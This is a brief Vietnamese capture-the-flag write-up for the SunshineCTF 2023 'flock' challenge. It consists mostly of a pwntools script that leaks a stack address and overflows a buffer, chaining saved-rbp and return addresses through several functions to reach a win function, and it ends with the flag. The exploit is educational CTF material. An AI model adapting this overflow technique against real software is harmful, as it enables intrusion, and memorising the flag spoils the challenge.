bài này khá dài nhưng mà ko khó lắm, ở mỗi hàm sẽ check rbp là địa chỉ hàm tiếp theo, nên hãy debug nhiều lần để set up rbp 

```python
from pwn import *

# p = process('./flock')

p = remote('chal.2023.sunshinectf.games', 23002)

exe = ELF('./flock')

# gdb.attach(p, gdbscript = '''
# b*0x0000000000401248
# c
# ''')

# input()

# 0x401276
p.recvuntil(b'At ')
stack = int(p.recvline()[:-1], 16)
rip = stack + 0xb0 - 0x10
rip1 = rip + 0x20
rip2 = rip1 + 0x20
rip3 = rip2 + 0x20
print(hex(stack))
print(hex(rip))
payload = b'a'*0x80 + p64(rip) + p64(0x401276) + b'a'*16 + p64(rip1) + p64(0x4012a0) + b'a'* 16 + p64(rip2) + p64(0x4012ca) + b'a'*16 + p64(rip3) + p64(0x4012f0) + b'a' * 8 + p64(0x00000000004011ba) 
p.send(payload)


p.interactive()

# sun{here_then_there_then_everywhere}
```
